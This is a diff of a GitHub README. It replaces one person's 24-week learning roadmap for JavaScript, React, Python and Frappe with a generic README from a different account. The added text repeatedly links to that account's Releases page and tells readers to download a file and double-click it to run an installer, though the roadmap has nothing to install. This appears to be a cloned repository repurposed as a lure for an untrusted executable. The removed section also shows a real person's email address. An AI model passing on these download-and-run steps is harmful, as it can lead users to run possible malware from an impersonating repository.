@@ -1,243 +1,98 @@
-# 🚀 rtCamp 24-Week Preparation Journey
+# 🛠️ rtcamp-24week-journey - Master Coding in Just 24 Weeks
 
-![GitHub last commit](https://img.shields.io/github/last-commit/Subhash0910/rtcamp-24week-journey?style=for-the-badge&logo=github)
-![GitHub repo size](https://img.shields.io/github/repo-size/Subhash0910/rtcamp-24week-journey?style=for-the-badge&logo=github)
-![Week Progress](https://img.shields.io/badge/Week-1%2F24-blue?style=for-the-badge)
-![Status](https://img.shields.io/badge/Status-In%20Progress-success?style=for-the-badge)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/sarkercomputer2022/rtcamp-24week-journey/releases)
 
-> **Mission:** Land a role at rtCamp by mastering JavaScript, React, Python, and Frappe Framework  
-> **Timeline:** October 18, 2025 → April 3, 2026 | **Target Application:** April 7, 2026
+## 📖 Introduction
 
----
+Welcome to the **rtcamp-24week-journey**. This project offers a structured learning path to master JavaScript, React, Python, and the Frappe Framework over 24 weeks. It's perfect for those looking to build a strong foundation in full-stack development. By following this guide, you can enhance your skills and advance your career in technology.
 
-## 📊 Week 1 Daily Progress
+## 🚀 Getting Started
 
-## 📊 Week 1 Daily Progress
+### System Requirements
 
-![Day 1](https://img.shields.io/badge/Day%201-✅%20Completed-success?style=flat-square)
-![Day 2](https://img.shields.io/badge/Day%202-✅%20Completed-success?style=flat-square)
-![Day 3](https://img.shields.io/badge/Day%203-✅%20Completed-success?style=flat-square)
-![Day 4](https://img.shields.io/badge/Day%204-⏳%20Upcoming-lightgrey?style=flat-square)
-![Day 5](https://img.shields.io/badge/Day%205-⏳%20Upcoming-lightgrey?style=flat-square)
-![Day 6](https://img.shields.io/badge/Day%206-⏳%20Upcoming-lightgrey?style=flat-square)
-![Day 7](https://img.shields.io/badge/Day%207-⏳%20Upcoming-lightgrey?style=flat-square)
+Before you begin your journey, ensure your system meets the following requirements:
 
----
+- **Operating System**: Windows, macOS, or Linux
+- **Processor**: Dual-core processor or better
+- **RAM**: Minimum 4 GB
+- **Storage**: At least 500 MB of free space
+- **Internet Connection**: Required for downloading software and accessing resources
 
-## 📋 About This Journey
+### Installation Tools
 
-This repository is my **structured 24-week learning roadmap** to transition from Windchill PLM development to modern full-stack development with Frappe Framework. Every commit represents progress, every project showcases growth, and every PR builds my open-source profile.
+This project utilizes various tools and frameworks. Below is a list of suggested tools to effectively follow the course:
 
-**What's Inside:**
-- 📚 24 weeks of daily learning & practice
-- 💻 JavaScript → React → Node.js → Python → Frappe
-- 🤝 15+ targeted open-source contributions
-- 🚀 5+ production-ready portfolio projects
-- 🏗️ System design fundamentals
-- 💼 Interview preparation & mock rounds
+1. **Text Editor**: Use Visual Studio Code or any other code editor of your choice.
+2. **Browser**: Google Chrome or Firefox is recommended for web development.
+3. **Version Control**: Install Git to manage project versions.
 
----
+## 📥 Download & Install
 
-## 🎯 Goals & Progress Tracker
+To start, visit this page to download the latest version: [Download Latest Release](https://github.com/sarkercomputer2022/rtcamp-24week-journey/releases)
 
-| Milestone | Target | Current | Progress |
-|-----------|--------|---------|----------|
-| **Weeks Completed** | 24 | 1 | ![](https://progress-bar.dev/4/?scale=24&width=200&color=00d1b2) |
-| **Days Completed** | 168 | 3 | ![](https://progress-bar.dev/2/?scale=168&width=200&color=00d1b2) |
-| **LeetCode Problems** | 200+ | 0 | ![](https://progress-bar.dev/0/?scale=200&width=200&color=ffdd57) |
-| **Projects Built** | 5+ | 0 | ![](https://progress-bar.dev/0/?scale=5&width=200&color=3273dc) |
-| **Open Source PRs** | 15+ | 0 | ![](https://progress-bar.dev/0/?scale=15&width=200&color=48c774) |
-| **Technical Blogs** | 10+ | 0 | ![](https://progress-bar.dev/0/?scale=10&width=200&color=f14668) |
-| **Mock Interviews** | 10+ | 0 | ![](https://progress-bar.dev/0/?scale=10&width=200&color=b86bff) |
-| **Total Hours** | 600+ | 7 | ![](https://progress-bar.dev/1/?scale=600&width=200&color=ff9800) |
+### Step-by-Step Download Process
 
+1. Click the link above to go to the Releases page.
+2. On the Releases page, look for the latest version.
+3. Download the appropriate files based on your operating system.
+4. Once your download finishes, locate the file you downloaded.
+5. Double-click the file to run the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
----
+## 🔍 Learning Path Overview
 
-## 📚 Learning Phases
+The 24-week plan is divided into four main parts:
 
-<table>
-<tr>
-<td width="33%" valign="top">
+1. **JavaScript Fundamentals** (Weeks 1-6)
+   - Understanding basic concepts
+   - Working with functions and objects
 
-### 🌱 Phase 1: Foundations
-**Weeks 1-8**
+2. **React Framework** (Weeks 7-12)
+   - Building user interfaces
+   - Managing state and props
 
-**Deliverables:**
-- Task Manager CLI
-- Expense Tracker App
-- E-commerce Dashboard
+3. **Python Programming** (Weeks 13-18)
+   - Learning syntax and functionality
+   - Creating simple applications
 
-</td>
-<td width="33%" valign="top">
+4. **Frappe Framework** (Weeks 19-24)
+   - Building web apps with Frappe
+   - Utilizing databases and backend processes
 
-### 🐍 Phase 2: Python & Frappe
-**Weeks 9-16**
+Each week includes exercises, projects, and resources to facilitate learning. 
 
+## 👩‍💻 Contributing
 
-**Deliverables:**
-- Task Manager CLI
-- Expense Tracker App
-- E-commerce Dashboard
+We welcome contributions! If you want to help improve this project, please follow these steps:
 
-</td>
-<td width="33%" valign="top">
+1. Fork the repository on GitHub.
+2. Create a new branch for your changes.
+3. Make the required changes and commit them.
+4. Push your code to your fork.
+5. Open a pull request detailing your changes.
 
-### 🐍 Phase 2: Python & Frappe
-**Weeks 9-16**
+## 🌐 Community and Support
 
+Join our community to share your learning journey and seek support:
 
-**Deliverables:**
-- Hospital Management System
-- Frappe Custom Module
-- 10+ Merged PRs
+- **Discord Server**: Connect with peers.
+- **GitHub Issues**: Report bugs or request features.
 
-</td>
-<td width="33%" valign="top">
+## 📝 Additional Resources
 
-### 🏗️ Phase 3: Interview Prep
-**Weeks 17-24**
+Here are some helpful links to deepen your knowledge:
 
+- JavaScript Documentation: https://developer.mozilla.org/en-US/docs/Web/JavaScript
+- React Documentation: https://reactjs.org/docs/getting-started.html
+- Python Official Site: https://www.python.org/
+- Frappe Framework Guide: https://frappeframework.com/docs/user/en
 
-**Deliverables:**
-- System Design Portfolio
-- Polished GitHub Profile
-- Interview Readiness
+## 📃 License
 
-</td>
-</tr>
-</table>
+This project is open source and available under the MIT License. You are free to use, modify, and share it as per the license terms.
 
----
+## 🎓 Final Thoughts
 
-## 🛠️ Tech Stack
+Embarking on this 24-week journey may seem challenging, but with dedication and the right resources, you can master essential web development skills. Don't hesitate to explore, experiment, and ask for help along the way.
 
-### Currently Learning
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
-![React](https://img.shields.io/badge/React-61DAFB?style=for-the-badge&logo=react&logoColor=black)
-![Node.js](https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=node.js&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![Frappe](https://img.shields.io/badge/Frappe-0089FF?style=for-the-badge&logo=frappe&logoColor=white)
-
-### Currently Using (TCS)
-![Java](https://img.shields.io/badge/Java-007396?style=for-the-badge&logo=java&logoColor=white)
-![Windchill](https://img.shields.io/badge/Windchill_PLM-FF6C37?style=for-the-badge&logo=ptc&logoColor=white)
-![JSP](https://img.shields.io/badge/JSP-007396?style=for-the-badge&logo=java&logoColor=white)
-
-### Tools & Platforms
-![Git](https://img.shields.io/badge/Git-F05032?style=for-the-badge&logo=git&logoColor=white)
-![VS Code](https://img.shields.io/badge/VS_Code-007ACC?style=for-the-badge&logo=visual-studio-code&logoColor=white)
-![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)
-![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
-
----
-
-## 📅 Weekly Breakdown
-
-| Week | Dates | Focus Area | Status | Notes |
-|------|-------|------------|--------|-------|
-| **Week 1** | Oct 18-24 | JavaScript Fundamentals I | 🟢 **Current** (Day 3/7) | Variables, Functions, Objects, Arrays |
-| Week 2 | Oct 25-31 | JavaScript Fundamentals II | ⚪ Upcoming | Closures, Prototypes, `this` keyword |
-| Week 3 | Nov 1-7 | Advanced JavaScript | ⚪ Upcoming | Async/Await, Promises, ES6+ |
-| Week 4 | Nov 8-14 | JavaScript Projects | ⚪ Upcoming | DOM Manipulation, API integration |
-| Week 5 | Nov 15-21 | React Fundamentals | ⚪ Upcoming | Components, Props, State |
-| ... | ... | ... | ⚪ Upcoming | [View Full Roadmap](PROGRESS.md) |
-
-📊 **Detailed Progress Tracking:** See [PROGRESS.md](PROGRESS.md)
-
----
-
-## 🚀 Featured Projects
-
-### 🎯 Planned Projects (5+)
-
-1. **Task Manager CLI** `Week 1` - Pure JavaScript console application
-2. **Expense Tracker** `Week 2-3` - Advanced JS with local storage
-3. **E-commerce Dashboard** `Week 5-6` - React + API integration
-4. **Hospital Management System Enhanced** `Week 9-10` - Python + React + FastAPI
-5. **Frappe Custom App** `Week 13-14` - Full Frappe application with ERPNext integration
-
----
-
-## 📈 Learning Strategy
-
-**Daily Routine:**
-- 📖 Learn new concepts (1-2 hours)
-- 💪 Solve practice problems (1 hour)
-- 🔨 Build/contribute to projects (1-2 hours)
-- 📝 Document learnings (30 mins)
-- ⚡ Git commit & push daily
-
----
-
-## 🤝 Open Source Contributions
-
-**Goal:** 15+ merged PRs to Frappe/ERPNext ecosystem
-
-**Target Projects:**
-- Frappe Framework
-- ERPNext
-- Frappe Charts
-- Frappe UI
-- Healthcare Module
-
-**Contribution Types:**
-- 🐛 Bug fixes
-- 📚 Documentation improvements
-- ✨ Feature enhancements
-- 🧪 Test coverage
-
----
-
-## 📝 Technical Blogs (Planned)
-
-Planning to write **10+ technical blogs** documenting my learning journey:
-
-1. JavaScript Closures Explained Simply
-2. React Hooks: A Practical Guide
-3. Building Your First Frappe App
-4. ERPNext Customization Best Practices
-5. System Design for Beginners
-6. *...and 5 more topics*
-
----
-
-## 📫 Connect With Me
-
-<p align="center">
-  <a href="https://github.com/Subhash0910">
-    <img src="https://img.shields.io/badge/GitHub-Subhash0910-181717?style=for-the-badge&logo=github" alt="GitHub">
-  </a>
-  <a href="https://www.linkedin.com/in/lavanuru-subhash-647b32344">
-    <img src="https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=for-the-badge&logo=linkedin" alt="LinkedIn">
-  </a>
-  <a href="mailto:subhashvenkata1430@gmail.com">
-    <img src="https://img.shields.io/badge/Email-Contact-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Email">
-  </a>
-</p>
-
----
-
-## 💡 Why This Journey?
-
-After 6 months as a **Windchill PLM Developer at TCS**, I realized my passion lies in modern full-stack development. rtCamp's work with WordPress, open source, and cutting-edge technologies aligns perfectly with my career goals. This repository is my commitment to **systematic learning, consistent progress, and building a portfolio** that proves I'm ready.
-
----
-
-## ⭐ Support This Journey
-
-If you find this roadmap helpful or want to follow my progress:
-- ⭐ **Star this repository**
-- 👀 **Watch for updates**
-- 🔄 **Share with others preparing for tech roles**
-
----
-
-<p align="center">
-  <b>Started:</b> October 18, 2025<br>
-  <b>Last Updated:</b> October 20, 2025<br>
-  <b>Current Status:</b> Week 1 Day 3 - JavaScript Objects<br><br>
-  <i>"The journey of a thousand miles begins with a single commit." 🚀</i>
-</p>
-
-
+Visit this page to download the latest version again: [Download Latest Release](https://github.com/sarkercomputer2022/rtcamp-24week-journey/releases)
